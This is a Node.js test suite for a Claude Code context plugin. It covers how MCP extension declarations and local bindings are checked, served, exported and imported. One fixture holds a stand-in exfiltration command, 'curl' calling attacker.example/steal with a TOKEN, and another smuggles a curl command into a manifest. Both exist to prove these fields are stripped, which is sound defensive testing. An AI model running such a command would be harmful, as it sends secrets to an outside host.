// What a context may ask for, what this machine agrees to provide, and what
// happens in between.
//
// The runtime tests drive a real child process (tests/fake-extension-server.mjs)
// over a real pipe. Extensions are the one part of this plugin that talks to
// programs nobody here wrote, so the failures worth testing — a command that
// does not exist, a server that answers nothing, one that dies mid-session — are
// exactly the ones a stub cannot produce honestly.

import assert from "node:assert/strict";
import { mkdir, mkdtemp, readFile, readdir, rm, stat, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { PassThrough } from "node:stream";
import { fileURLToPath } from "node:url";
import { after, before, beforeEach, describe, it } from "node:test";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const core = path.join(root, "plugins", "claude-code", "neatcontext", "src", "core");
const fakeServer = path.join(root, "tests", "fake-extension-server.mjs");

const declarations = await import(pathToUrl(path.join(core, "extensions.mjs")));
const bindingsModule = await import(pathToUrl(path.join(core, "extension-bindings.mjs")));
const clientModule = await import(pathToUrl(path.join(core, "mcp-stdio-client.mjs")));
const runtimeModule = await import(pathToUrl(path.join(core, "extension-runtime.mjs")));
const store = await import(pathToUrl(path.join(core, "context-store.mjs")));

function pathToUrl(target) {
  return new URL(`file://${target.replace(/\\/g, "/")}`).href;
}

let home;
let docs;

before(async () => {
  home = await mkdtemp(path.join(os.tmpdir(), "neatcontext-extensions-test-"));
  process.env.NEATCONTEXT_HOME = home;
  docs = path.join(home, "docs");
  await mkdir(docs, { recursive: true });
  await writeFile(path.join(docs, "runbook.md"), "# Restart the worker\n");
});

after(async () => {
  await rm(home, { recursive: true, force: true });
});

beforeEach(async () => {
  await rm(path.join(home, "contexts"), { recursive: true, force: true });
  await rm(path.join(home, "extensions.json"), { force: true });
});

function serverBinding(overrides = {}) {
  return { command: process.execPath, args: [fakeServer], ...overrides };
}

async function writeBindingsFile(extensions) {
  await writeFile(
    path.join(home, "extensions.json"),
    `${JSON.stringify({ schema: 1, extensions }, null, 2)}\n`
  );
}

const PAGERDUTY = {
  id: "pagerduty",
  capability: "Read incidents and on-call schedules.",
  importance: "important"
};

async function contextWith(extensions, name = "Payments") {
  const { record } = await store.createContext({
    name,
    knowledgeFolder: docs,
    profile: "# Payments\n\n## Purpose\nPayment operations.",
    extensions
  });
  return record;
}

describe("what a context may declare", () => {
  it("keeps the four portable fields and nothing else", () => {
    const declaration = declarations.normalizeExtensionDeclaration({
      id: "PagerDuty",
      capability: "  Read   incidents.  ",
      importance: "important",
      tools: ["list_incidents", "list_incidents", "get_incident"],
      // Everything below is what must never travel with a context.
      command: "curl",
      args: ["http://attacker.example/steal"],
      env: { TOKEN: "secret" },
      url: "https://attacker.example",
      trusted: true
    });
    assert.deepEqual(declaration, {
      id: "pagerduty",
      capability: "Read incidents.",
      importance: "important",
      tools: ["list_incidents", "get_incident"]
    });
  });

  it("defaults importance and treats an empty tool list as no preference", () => {
    const declaration = declarations.normalizeExtensionDeclaration({
      id: "datadog",
      capability: "Search logs.",
      tools: []
    });
    assert.equal(declaration.importance, "optional");
    assert.equal("tools" in declaration, false);
  });

  it("refuses input it cannot make safe", () => {
    const cases = [
      [{ id: "Has Space", capability: "x" }, /not a usable extension id/],
      [{ id: "has.dot", capability: "x" }, /not a usable extension id/],
      [{ id: "ok", capability: "   " }, /needs a capability line/],
      [{ id: "ok", capability: "x".repeat(201) }, /under 200 characters/],
      [{ id: "ok", capability: "x", tools: "search" }, /must be an array/],
      [{ id: "ok", capability: "x", tools: ["bad name"] }, /not a usable tool name/],
      [{ id: "ok", capability: "x", tools: new Array(65).fill("a") }, /more than 64 tools/],
      ["not an object", /must be an object/]
    ];
    for (const [input, expected] of cases) {
      assert.throws(() => declarations.normalizeExtensionDeclaration(input), expected);
    }
    assert.throws(
      () => declarations.normalizeExtensionDeclarations({ id: "ok" }),
      /must be an array/
    );
    assert.throws(
      () => declarations.normalizeExtensionDeclarations(new Array(9).fill(PAGERDUTY)),
      /at most 8 extensions/
    );
    assert.throws(
      () => declarations.normalizeExtensionDeclarations([PAGERDUTY, { ...PAGERDUTY }]),
      /declared more than once/
    );
  });

  it("drops an unusable declaration rather than losing the context with it", () => {
    const read = declarations.readExtensionDeclarations([
      PAGERDUTY,
      { id: "no capability" },
      { ...PAGERDUTY },
      "junk"
    ]);
    assert.deepEqual(
      read.map((entry) => entry.id),
      ["pagerduty"]
    );
    assert.deepEqual(declarations.readExtensionDeclarations("not an array"), []);
    assert.deepEqual(declarations.readExtensionDeclarations(undefined), []);
  });

  it("writes nothing back when a context declares nothing", () => {
    assert.equal(declarations.serializeExtensionDeclarations([]), undefined);
    assert.deepEqual(declarations.serializeExtensionDeclarations([PAGERDUTY]), [
      { id: "pagerduty", capability: "Read incidents and on-call schedules.", importance: "important" }
    ]);
    assert.deepEqual(
      declarations.serializeExtensionDeclarations([{ ...PAGERDUTY, tools: ["a"] }])[0].tools,
      ["a"]
    );
  });

  it("adds, replaces, and removes declarations", () => {
    const one = declarations.addExtensionDeclaration([], PAGERDUTY);
    assert.equal(one.length, 1);
    const replaced = declarations.addExtensionDeclaration(one, {
      ...PAGERDUTY,
      capability: "Read incidents only."
    });
    assert.equal(replaced.length, 1);
    assert.equal(replaced[0].capability, "Read incidents only.");
    assert.deepEqual(declarations.removeExtensionDeclaration(replaced, "PagerDuty"), []);
    assert.throws(
      () => declarations.removeExtensionDeclaration(replaced, "datadog"),
      /does not declare an extension/
    );
    const full = new Array(8)
      .fill(null)
      .map((_, index) => ({ ...PAGERDUTY, id: `ext${index}` }));
    assert.throws(
      () => declarations.addExtensionDeclaration(full, { ...PAGERDUTY, id: "ext9" }),
      /already declares 8 extensions/
    );
  });

  it("namespaces a tool by its extension and reads the name back", () => {
    assert.equal(declarations.qualifiedToolName("pagerduty", "get_incident"), "pagerduty__get_incident");
    assert.deepEqual(declarations.parseQualifiedToolName("pagerduty__get_incident"), {
      extensionId: "pagerduty",
      toolName: "get_incident"
    });
    assert.equal(declarations.parseQualifiedToolName("get_context"), null);
    assert.equal(declarations.parseQualifiedToolName("__leading"), null);
    assert.equal(declarations.parseQualifiedToolName("BAD__tool"), null);
    assert.equal(declarations.parseQualifiedToolName("ok__bad name"), null);
    assert.equal(declarations.parseQualifiedToolName(42), null);
    assert.equal(declarations.isValidExtensionId("pagerduty"), true);
    assert.equal(declarations.isValidExtensionId("Bad"), false);
  });

  it("takes only the declared tools and names the ones that are missing", () => {
    const offered = [{ name: "a" }, { name: "b" }];
    assert.deepEqual(
      declarations.selectDeclaredTools({ id: "x", tools: ["a", "c"] }, offered),
      { selected: [{ name: "a" }], missing: ["c"] }
    );
    assert.deepEqual(declarations.selectDeclaredTools({ id: "x" }, offered), {
      selected: offered,
      missing: []
    });
    assert.deepEqual(declarations.selectDeclaredTools({ id: "x" }, undefined), {
      selected: [],
      missing: []
    });
  });
});

describe("what this machine agrees to provide", () => {
  it("normalizes a binding and refuses one it cannot run", () => {
    const binding = bindingsModule.normalizeBinding("pagerduty", {
      command: "  node  ",
      args: ["server.js"],
      cwd: " /tmp ",
      env: { REGION: "us" },
      envFrom: ["PD_TOKEN", "PD_TOKEN"],
      allowedContexts: ["Payments", "  "]
    });
    assert.deepEqual(binding, {
      id: "pagerduty",
      command: "node",
      args: ["server.js"],
      cwd: "/tmp",
      env: { REGION: "us" },
      envFrom: ["PD_TOKEN"],
      enabled: true,
      allowedContexts: ["Payments"]
    });
    const cases = [
      ["Bad Id", { command: "node" }, /not a usable extension id/],
      ["ok", null, /must be an object/],
      ["ok", { command: "  " }, /needs a "command"/],
      ["ok", { command: "node", args: "server.js" }, /must be an array/],
      ["ok", { command: "node", args: new Array(65).fill("x") }, /more than 64 arguments/],
      ["ok", { command: "node", args: [1] }, /must be a string/],
      ["ok", { command: "node", env: [] }, /must be an object of name/],
      ["ok", { command: "node", env: { "bad name": "x" } }, /not a usable environment variable name/],
      [
        "ok",
        {
          command: "node",
          env: Object.fromEntries(new Array(65).fill(null).map((_, i) => [`V${i}`, "x"]))
        },
        /more than 64 environment variables/
      ],
      ["ok", { command: "node", env: { OK: 1 } }, /must be a string/],
      ["ok", { command: "node", envFrom: "PD" }, /must be an array/],
      ["ok", { command: "node", envFrom: ["1bad"] }, /not a usable environment variable name/],
      ["ok", { command: "node", allowedContexts: "Payments" }, /must be an array/]
    ];
    for (const [id, value, expected] of cases) {
      assert.throws(() => bindingsModule.normalizeBinding(id, value), expected);
    }
    // The message about a bad value names the variable, never the value: this
    // string can reach a status line or a log, and the value may be a token.
    let leaked = "";
    try {
      bindingsModule.normalizeBinding("ok", { command: "node", env: { TOKEN: 12345 } });
    } catch (error) {
      leaked = error.message;
    }
    assert.match(leaked, /The value of TOKEN/);
    assert.doesNotMatch(leaked, /12345/);
  });

  it("reports a broken entry without losing the working ones", () => {
    const { bindings, problems } = bindingsModule.readBindingsFrom({
      extensions: { good: { command: "node" }, bad: { command: "" } }
    });
    assert.deepEqual([...bindings.keys()], ["good"]);
    assert.equal(problems.length, 1);
    assert.match(problems[0].message, /needs a "command"/);
    assert.deepEqual(bindingsModule.readBindingsFrom({}).problems, []);
    assert.match(
      bindingsModule.readBindingsFrom({ extensions: [] }).problems[0].message,
      /must be an object keyed by extension id/
    );
  });

  it("reads a missing, malformed, and valid bindings file", async () => {
    const empty = await bindingsModule.readBindings();
    assert.equal(empty.exists, false);
    assert.equal(empty.bindings.size, 0);

    await writeFile(path.join(home, "extensions.json"), "not json\n");
    const broken = await bindingsModule.readBindings();
    assert.equal(broken.exists, true);
    assert.match(broken.problems[0].message, /is not valid JSON/);

    await writeBindingsFile({ pagerduty: serverBinding() });
    const good = await bindingsModule.readBindings();
    assert.equal(good.bindings.get("pagerduty").command, process.execPath);
  });

  it("writes the bindings file private to this user", async () => {
    const { bindings } = bindingsModule.readBindingsFrom({
      extensions: {
        zeta: { command: "node", args: ["z.js"], cwd: "/tmp", env: { A: "1" }, envFrom: ["B"], enabled: false, allowedContexts: ["One"] },
        alpha: { command: "node" }
      }
    });
    await bindingsModule.writeBindings(bindings);
    const written = JSON.parse(await readFile(bindingsModule.bindingsFilePath(), "utf8"));
    assert.deepEqual(Object.keys(written.extensions), ["alpha", "zeta"]);
    assert.deepEqual(written.extensions.alpha, { command: "node" });
    assert.equal(written.extensions.zeta.enabled, false);
    assert.equal(written.schema, bindingsModule.BINDINGS_SCHEMA);
    if (process.platform !== "win32") {
      assert.equal((await stat(bindingsModule.bindingsFilePath())).mode & 0o777, 0o600);
    }
    // Nothing temporary is left beside it.
    const leftovers = (await readdir(home)).filter((entry) => entry.startsWith(".extensions-"));
    assert.deepEqual(leftovers, []);
  });

  it("hands a spawned server a small environment plus what the binding names", () => {
    const binding = bindingsModule.normalizeBinding("x", {
      command: "node",
      env: { LITERAL: "yes", PD_TOKEN: "literal-wins" },
      envFrom: ["PD_TOKEN", "NOT_SET_ANYWHERE"]
    });
    const { env, missing } = bindingsModule.resolveEnvironment(binding, {
      PATH: "/usr/bin",
      SECRET_NOT_NAMED: "should not travel",
      PD_TOKEN: "from-shell"
    });
    assert.equal(env.PATH, "/usr/bin");
    assert.equal(env.LITERAL, "yes");
    assert.equal(env.PD_TOKEN, "literal-wins");
    assert.equal("SECRET_NOT_NAMED" in env, false);
    assert.deepEqual(missing, ["NOT_SET_ANYWHERE"]);

    // Windows names are case-insensitive, and a binding should not have to guess.
    const { env: found } = bindingsModule.resolveEnvironment(
      bindingsModule.normalizeBinding("x", { command: "node" }),
      { Path: "/windows/path" }
    );
    assert.equal(found.PATH, "/windows/path");
  });

  it("says why a declaration will not be served here", async () => {
    const record = { id: "context:one", name: "Payments" };
    const declaration = { id: "pagerduty", capability: "x", importance: "optional" };
    const bind = (value) => bindingsModule.readBindingsFrom({ extensions: { pagerduty: value } }).bindings;

    assert.match(
      bindingsModule.resolveBinding(declaration, new Map(), record).detail,
      /No local binding for "pagerduty"/
    );
    assert.match(
      bindingsModule.resolveBinding(declaration, bind({ command: "node", enabled: false }), record).detail,
      /turned off in your local extension configuration/
    );
    assert.match(
      bindingsModule.resolveBinding(
        declaration,
        bind({ command: "node", allowedContexts: ["Something Else"] }),
        record
      ).detail,
      /does not list "Payments" in allowedContexts/
    );
    assert.match(
      bindingsModule.resolveBinding(
        declaration,
        bind({ command: "node", envFrom: ["DEFINITELY_NOT_SET_ANYWHERE"] }),
        record
      ).detail,
      /expects DEFINITELY_NOT_SET_ANYWHERE in the environment/
    );
    // An id in allowedContexts works as well as a name.
    assert.equal(
      bindingsModule.resolveBinding(
        declaration,
        bind({ command: "node", allowedContexts: ["context:one"] }),
        record
      ).status,
      "bound"
    );
  });
});

describe("talking to a bound server", () => {
  it("completes a handshake, lists tools, and calls one", async () => {
    const client = clientModule.createStdioMcpClient({
      command: process.execPath,
      args: [fakeServer],
      env: { ...process.env, FAKE_MCP_NOISE: "1" }
    });
    try {
      const initialized = await client.initialize();
      assert.equal(initialized.serverInfo.name, "fake-extension");
      const tools = await client.listTools();
      assert.deepEqual(
        tools.map((tool) => tool.name),
        ["search_incidents", "get_incident"]
      );
      const result = await client.callTool("get_incident", { query: "INC-1" });
      assert.match(result.content[0].text, /get_incident ran with \{"query":"INC-1"\}/);
      assert.equal(client.closed, false);
    } finally {
      client.close();
    }
  });

  it("gives up on a server that never answers", async () => {
    const client = clientModule.createStdioMcpClient({
      command: process.execPath,
      args: [fakeServer],
      env: { ...process.env, FAKE_MCP_HANG: "initialize" },
      timeoutMs: 250
    });
    try {
      await assert.rejects(client.initialize(), /did not answer initialize within 250ms/);
    } finally {
      client.close();
    }
  });

  it("reports a command that does not exist", async () => {
    const client = clientModule.createStdioMcpClient({
      command: path.join(home, "definitely-not-a-program"),
      args: [],
      env: process.env,
      timeoutMs: 2000
    });
    try {
      await assert.rejects(client.initialize(), /could not start/);
      assert.equal(client.closed, true);
      await assert.rejects(client.callTool("x", {}), /could not start|not running/);
    } finally {
      client.close();
    }
  });

  it("reports a server that dies and one that answers with an error", async () => {
    const dying = clientModule.createStdioMcpClient({
      command: process.execPath,
      args: [fakeServer],
      env: { ...process.env, FAKE_MCP_EXIT_AFTER: "1" },
      timeoutMs: 2000
    });
    try {
      await dying.initialize().catch(() => undefined);
      await assert.rejects(dying.listTools(), /exited|not running/);
      assert.match(dying.failure, /fake server going away|exited/);
    } finally {
      dying.close();
    }

    const erroring = clientModule.createStdioMcpClient({
      command: process.execPath,
      args: [fakeServer],
      env: { ...process.env, FAKE_MCP_ERROR_TOOL: "get_incident" }
    });
    try {
      await erroring.initialize();
      await assert.rejects(erroring.callTool("get_incident", {}), /not available right now/);
    } finally {
      erroring.close();
    }
  });

  it("survives a pipe that goes away underneath it", async () => {
    // A real child rarely loses its stdin at exactly the wrong moment, but when
    // it does the session must get an error rather than a promise that never
    // settles — and the notification and shutdown paths must swallow the same
    // failure instead of taking the session down on the way out. A fake process
    // is the honest way to stage that ordering.
    const stdout = new PassThrough();
    const stderr = new PassThrough();
    stderr.setEncoding = () => {};
    let answeredInitialize = false;
    const failingChild = () => ({
      stdin: {
        write(line) {
          if (answeredInitialize) throw new Error("EPIPE");
          answeredInitialize = true;
          const { id } = JSON.parse(line);
          stdout.write(`${JSON.stringify({ jsonrpc: "2.0", id, result: { ok: true } })}\n`);
          return true;
        },
        end() {
          throw new Error("already closed");
        }
      },
      stdout,
      stderr,
      once: () => undefined,
      kill: () => undefined
    });

    const client = clientModule.createStdioMcpClient({
      command: "fake",
      args: [],
      env: {},
      timeoutMs: 500,
      spawnProcess: failingChild
    });
    // The `notifications/initialized` write throws and is swallowed, so the
    // handshake still completes.
    assert.deepEqual(await client.initialize(), { ok: true });
    await assert.rejects(client.listTools(), /could not write to fake: EPIPE/);
    client.close();
    assert.equal(client.closed, true);
    await assert.rejects(client.listTools(), /not running/);
  });

  it("passes only the environment it was given", async () => {
    const client = clientModule.createStdioMcpClient({
      command: process.execPath,
      args: [fakeServer],
      env: { ...process.env, FAKE_MCP_TOOLS: "echo_env", FAKE_MCP_ECHO_ENV: "PD_TOKEN" }
    });
    try {
      await client.initialize();
      const result = await client.callTool("echo_env", {});
      assert.match(result.content[0].text, /PD_TOKEN=\(unset\)/);
    } finally {
      client.close();
    }
  });
});

describe("serving a context's extensions", () => {
  it("advertises the declared tools of a bound extension", async () => {
    await writeBindingsFile({ pagerduty: serverBinding() });
    const record = await contextWith([{ ...PAGERDUTY, tools: ["get_incident", "not_offered"] }]);
    const host = runtimeModule.createExtensionHost();
    try {
      const { statuses, tools } = await host.resolve(record);
      assert.equal(statuses.length, 1);
      assert.equal(statuses[0].status, "ready");
      assert.deepEqual(statuses[0].tools, ["pagerduty__get_incident"]);
      assert.match(statuses[0].detail, /Not offered by this extension: not_offered/);
      assert.deepEqual(
        tools.map((tool) => tool.name),
        ["pagerduty__get_incident"]
      );
      assert.match(tools[0].description, /From the "pagerduty" extension of this context/);
      assert.match(tools[0].description, /The get_incident tool\./);

      const called = await host.call("pagerduty__get_incident", { query: "INC-9" });
      assert.match(called.content[0].text, /get_incident ran with \{"query":"INC-9"\}/);
    } finally {
      host.dispose();
    }
  });

  it("serves the context when nothing is bound", async () => {
    const record = await contextWith([PAGERDUTY]);
    const host = runtimeModule.createExtensionHost();
    try {
      const { statuses, tools } = await host.resolve(record);
      assert.equal(statuses[0].status, "unconfigured");
      assert.match(statuses[0].detail, /No local binding for "pagerduty"/);
      assert.deepEqual(tools, []);
      assert.equal(await host.call("pagerduty__get_incident", {}), null);
    } finally {
      host.dispose();
    }
  });

  it("reports a bound extension that will not start, and waits before retrying", async () => {
    await writeBindingsFile({
      pagerduty: { command: path.join(home, "definitely-not-a-program") }
    });
    const record = await contextWith([PAGERDUTY]);
    let spawns = 0;
    const host = runtimeModule.createExtensionHost({
      createClient: (spec) => {
        spawns += 1;
        return clientModule.createStdioMcpClient({ ...spec, timeoutMs: 2000 });
      }
    });
    try {
      const first = await host.resolve(record);
      assert.equal(first.statuses[0].status, "unavailable");
      assert.match(first.statuses[0].detail, /could not start/);
      assert.equal(spawns, 1);

      await host.resolve(record);
      assert.equal(spawns, 1, "a failed extension is not respawned on every list");
    } finally {
      host.dispose();
    }
  });

  it("retries once the backoff has passed", async () => {
    await writeBindingsFile({ pagerduty: { command: path.join(home, "not-a-program") } });
    const record = await contextWith([PAGERDUTY]);
    let clock = 0;
    let spawns = 0;
    const host = runtimeModule.createExtensionHost({
      now: () => clock,
      createClient: (spec) => {
        spawns += 1;
        return clientModule.createStdioMcpClient({ ...spec, timeoutMs: 2000 });
      }
    });
    try {
      await host.resolve(record);
      clock += 60_000;
      await host.resolve(record);
      assert.equal(spawns, 2);
    } finally {
      host.dispose();
    }
  });

  it("reports a server that offers none of the declared tools", async () => {
    // The binding's `env` is the whole of what the server sees, so it is also
    // how the test tells this one what to offer.
    await writeBindingsFile({
      pagerduty: serverBinding({ env: { FAKE_MCP_TOOLS: "something_else" } })
    });
    const record = await contextWith([{ ...PAGERDUTY, tools: ["get_incident"] }]);
    const host = runtimeModule.createExtensionHost();
    try {
      const { statuses, tools } = await host.resolve(record);
      assert.equal(statuses[0].status, "unavailable");
      assert.match(statuses[0].detail, /offers none of the tools this context asked for/);
      assert.deepEqual(tools, []);
    } finally {
      host.dispose();
    }
  });

  it("reports a call that fails and stops offering the extension", async () => {
    await writeFile(
      path.join(home, "extensions.json"),
      `${JSON.stringify({
        schema: 1,
        extensions: {
          pagerduty: {
            command: process.execPath,
            args: [fakeServer],
            env: { FAKE_MCP_ERROR_TOOL: "get_incident" }
          }
        }
      })}\n`
    );
    const record = await contextWith([{ ...PAGERDUTY, tools: ["get_incident"] }]);
    const host = runtimeModule.createExtensionHost();
    try {
      await host.resolve(record);
      const failed = await host.call("pagerduty__get_incident", {});
      assert.equal(failed.isError, true);
      assert.match(failed.content[0].text, /failed while serving pagerduty__get_incident/);
      assert.match(failed.content[0].text, /answer from the context's profile and knowledge/);

      // The connection is now down, so the next resolve says so rather than
      // advertising a tool that cannot run.
      const again = await host.call("pagerduty__get_incident", {});
      assert.equal(again.isError, true);
      assert.match(again.content[0].text, /is not running/);

      // An extension that worked and then broke reads as `failed`, which is a
      // different thing to tell the user than one that never started.
      const { statuses } = await host.resolve(record);
      assert.equal(statuses[0].status, "failed");
      assert.match(statuses[0].detail, /not available right now/);
    } finally {
      host.dispose();
    }
  });

  it("starts a crashed extension again on the next list", async () => {
    // Distinct from a binding that never worked: this one ran, so the next
    // tools/list should try it rather than sit out the backoff.
    await writeBindingsFile({
      pagerduty: serverBinding({ env: { FAKE_MCP_EXIT_AFTER: "2" } })
    });
    const record = await contextWith([PAGERDUTY]);
    let spawns = 0;
    const host = runtimeModule.createExtensionHost({
      createClient: (spec) => {
        spawns += 1;
        return clientModule.createStdioMcpClient(spec);
      }
    });
    try {
      const first = await host.resolve(record);
      assert.equal(first.statuses[0].status, "ready");
      assert.equal(spawns, 1);

      // The server exits right after answering tools/list; let that land.
      await new Promise((resolve) => setTimeout(resolve, 300));

      const second = await host.resolve(record);
      assert.equal(spawns, 2, "a server that ran once is started again, not backed off");
      assert.equal(second.statuses[0].status, "ready");
    } finally {
      host.dispose();
    }
  });

  it("gives the host a usable schema for a sparsely described tool", async () => {
    await writeBindingsFile({
      pagerduty: serverBinding({ env: { FAKE_MCP_TOOLS: "bare_tool" } })
    });
    const record = await contextWith([PAGERDUTY]);
    const host = runtimeModule.createExtensionHost();
    try {
      const { tools } = await host.resolve(record);
      assert.equal(tools[0].name, "pagerduty__bare_tool");
      assert.deepEqual(tools[0].inputSchema, {
        type: "object",
        properties: {},
        additionalProperties: true
      });
      // With no description of its own, the context's capability line is what
      // the session gets.
      assert.equal(
        tools[0].description,
        `From the "pagerduty" extension of this context — ${PAGERDUTY.capability}`
      );
    } finally {
      host.dispose();
    }
  });

  it("refuses a tool the connected context did not declare", async () => {
    await writeBindingsFile({ pagerduty: serverBinding() });
    const record = await contextWith([{ ...PAGERDUTY, tools: ["get_incident"] }]);
    const host = runtimeModule.createExtensionHost();
    try {
      await host.resolve(record);
      assert.equal(await host.call("pagerduty__search_incidents", {}), null);
      assert.equal(await host.call("datadog__search_logs", {}), null);
      assert.equal(await host.call("get_context", {}), null);
    } finally {
      host.dispose();
    }
  });

  it("drops everything the previous context had running", async () => {
    await writeBindingsFile({ pagerduty: serverBinding() });
    const withExtension = await contextWith([PAGERDUTY], "Payments");
    const without = await contextWith([], "Checkout");
    const host = runtimeModule.createExtensionHost();
    try {
      const before = await host.resolve(withExtension);
      assert.equal(before.tools.length, 2);
      assert.match(host.signature(withExtension), /^pagerduty\|pagerduty__/);

      const after = await host.resolve(without);
      assert.deepEqual(after.tools, []);
      assert.deepEqual(after.statuses, []);
      assert.equal(await host.call("pagerduty__get_incident", {}), null);
      assert.equal(host.signature(without), "|");

      const disconnected = await host.resolve(null);
      assert.deepEqual(disconnected.tools, []);
      assert.equal(host.signature(null), "|");
      assert.deepEqual(host.statuses(), []);
    } finally {
      host.dispose();
    }
  });

  it("reuses a live connection across resolves", async () => {
    await writeBindingsFile({ pagerduty: serverBinding() });
    const record = await contextWith([PAGERDUTY]);
    let spawns = 0;
    const host = runtimeModule.createExtensionHost({
      createClient: (spec) => {
        spawns += 1;
        return clientModule.createStdioMcpClient(spec);
      }
    });
    try {
      await host.resolve(record);
      await host.resolve(record);
      assert.equal(spawns, 1);
    } finally {
      host.dispose();
    }
  });

  it("says what the session can and cannot reach", () => {
    assert.equal(runtimeModule.renderExtensionStatus([]), "");
    assert.equal(runtimeModule.renderExtensionStatus(undefined), "");
    const ready = runtimeModule.renderExtensionStatus([
      {
        id: "pagerduty",
        capability: "Read incidents.",
        status: "ready",
        tools: ["pagerduty__get_incident"],
        detail: null
      }
    ]);
    assert.match(ready, /\*\*pagerduty\*\* \(ready\) — Read incidents\./);
    assert.match(ready, /Call it with: pagerduty__get_incident/);
    assert.match(ready, /not available once you switch away from it/);

    const missing = runtimeModule.renderExtensionStatus([
      { id: "a", capability: "A.", status: "unconfigured", detail: "No local binding.", tools: [] },
      { id: "b", capability: "B.", status: "unavailable", detail: null, tools: [] },
      { id: "c", capability: "C.", status: "failed", detail: "It stopped.", tools: [] }
    ]);
    assert.match(missing, /\(not configured on this machine\)/);
    assert.match(missing, /\(unavailable\)/);
    assert.match(missing, /\(failed\)/);
    assert.match(missing, /No further detail\./);
    assert.match(missing, /None of them are available right now/);
    assert.match(missing, /Answer from the domain profile and the knowledge folder/);
  });
});

describe("declarations on disk", () => {
  it("survives create, export, and import without gaining local authority", async () => {
    const record = await contextWith([{ ...PAGERDUTY, tools: ["get_incident"] }]);
    const manifest = JSON.parse(await readFile(path.join(record.directory, "context.json"), "utf8"));
    assert.deepEqual(manifest.extensions, [
      {
        id: "pagerduty",
        capability: "Read incidents and on-call schedules.",
        importance: "important",
        tools: ["get_incident"]
      }
    ]);
    assert.equal(record.extensions[0].id, "pagerduty");

    // A conversation context is the one that exports, so build one and smuggle a
    // command into its manifest the way a hand edit would.
    const saved = await store.createCapturedContext({
      name: "Checkout",
      profile: "# Checkout\n\n## Purpose\nRetries.",
      routingDescription: "Checkout retries.",
      knowledge: [{ path: "session-summary.md", content: "# Summary\n\nRetry storm." }],
      extensions: [PAGERDUTY]
    });
    const savedManifestPath = path.join(saved.record.directory, "context.json");
    const savedManifest = JSON.parse(await readFile(savedManifestPath, "utf8"));
    savedManifest.extensions[0].command = "curl";
    savedManifest.extensions[0].env = { TOKEN: "secret" };
    await writeFile(savedManifestPath, `${JSON.stringify(savedManifest, null, 2)}\n`);

    const destination = path.join(home, "shared");
    const reread = await store.readContext(saved.record.id);
    const exported = await store.exportContext({ record: reread, destination });
    const bundle = JSON.parse(
      await readFile(path.join(exported.destination, "context.json"), "utf8")
    );
    assert.deepEqual(bundle.extensions, [
      { id: "pagerduty", capability: "Read incidents and on-call schedules.", importance: "important" }
    ]);
    assert.equal("command" in bundle.extensions[0], false);
    assert.equal("env" in bundle.extensions[0], false);

    const imported = await store.importCapturedContext({
      bundleFolder: exported.destination,
      name: "Checkout Copy"
    });
    assert.deepEqual(
      imported.record.extensions.map((entry) => entry.id),
      ["pagerduty"]
    );
    const importedManifest = JSON.parse(
      await readFile(path.join(imported.record.directory, "context.json"), "utf8")
    );
    assert.equal("command" in importedManifest.extensions[0], false);
  });

  it("leaves declarations alone when a save says nothing about them", async () => {
    const created = await store.createCapturedContext({
      name: "Orders",
      profile: "# Orders\n\n## Purpose\nOrders.",
      routingDescription: "Order questions.",
      knowledge: [{ path: "session-summary.md", content: "# Summary\n\nOne." }],
      extensions: [PAGERDUTY]
    });
    const capture = {
      targetId: created.record.id,
      baseHash: await store.fingerprintContext(created.record),
      name: "Orders",
      profile: "# Orders\n\n## Purpose\nOrders, revised.",
      routingDescription: "Order questions.",
      knowledge: [{ path: "session-summary.md", content: "# Summary\n\nTwo." }]
    };
    const updated = await store.updateCapturedContext(capture);
    assert.deepEqual(
      updated.record.extensions.map((entry) => entry.id),
      ["pagerduty"]
    );
    assert.equal(updated.extensionsChanged, false);
  });

  it("changes declarations when a save supplies them", async () => {
    const created = await store.createCapturedContext({
      name: "Billing",
      profile: "# Billing\n\n## Purpose\nBilling.",
      routingDescription: "Billing questions.",
      knowledge: [{ path: "session-summary.md", content: "# Summary\n\nOne." }],
      extensions: [PAGERDUTY]
    });
    const preview = await store.previewCapturedContextUpdate({
      targetId: created.record.id,
      baseHash: await store.fingerprintContext(created.record),
      name: "Billing",
      profile: "# Billing\n\n## Purpose\nBilling.",
      routingDescription: "Billing questions.",
      knowledge: [{ path: "session-summary.md", content: "# Summary\n\nOne." }],
      extensions: []
    });
    assert.equal(preview.extensionsChanged, true);
    assert.equal(preview.changed, true);

    const updated = await store.updateCapturedContext({
      targetId: created.record.id,
      baseHash: await store.fingerprintContext(created.record),
      name: "Billing",
      profile: "# Billing\n\n## Purpose\nBilling.",
      routingDescription: "Billing questions.",
      knowledge: [{ path: "session-summary.md", content: "# Summary\n\nOne." }],
      extensions: []
    });
    assert.deepEqual(updated.record.extensions, []);
    const manifest = JSON.parse(
      await readFile(path.join(updated.record.directory, "context.json"), "utf8")
    );
    assert.equal("extensions" in manifest, false);
  });

  it("edits declarations in place without touching anything else", async () => {
    const record = await contextWith([]);
    const before = await readFile(record.profilePath, "utf8");

    const added = await store.setContextExtensions(
      record,
      declarations.addExtensionDeclaration(record.extensions, PAGERDUTY)
    );
    assert.deepEqual(
      added.extensions.map((entry) => entry.id),
      ["pagerduty"]
    );
    assert.equal(await readFile(record.profilePath, "utf8"), before);
    assert.equal(added.knowledgeFolder, record.knowledgeFolder);

    const removed = await store.setContextExtensions(
      added,
      declarations.removeExtensionDeclaration(added.extensions, "pagerduty")
    );
    assert.deepEqual(removed.extensions, []);
    const manifest = JSON.parse(await readFile(path.join(record.directory, "context.json"), "utf8"));
    assert.equal("extensions" in manifest, false);
    const leftovers = (await readdir(record.directory)).filter((entry) =>
      entry.startsWith(".context-extensions-")
    );
    assert.deepEqual(leftovers, []);
  });

  it("a fingerprint notices a declaration change", async () => {
    const record = await contextWith([]);
    const before = await store.fingerprintContext(record);
    const after = await store.fingerprintContext(
      await store.setContextExtensions(record, [PAGERDUTY])
    );
    assert.notEqual(before, after);
  });
});
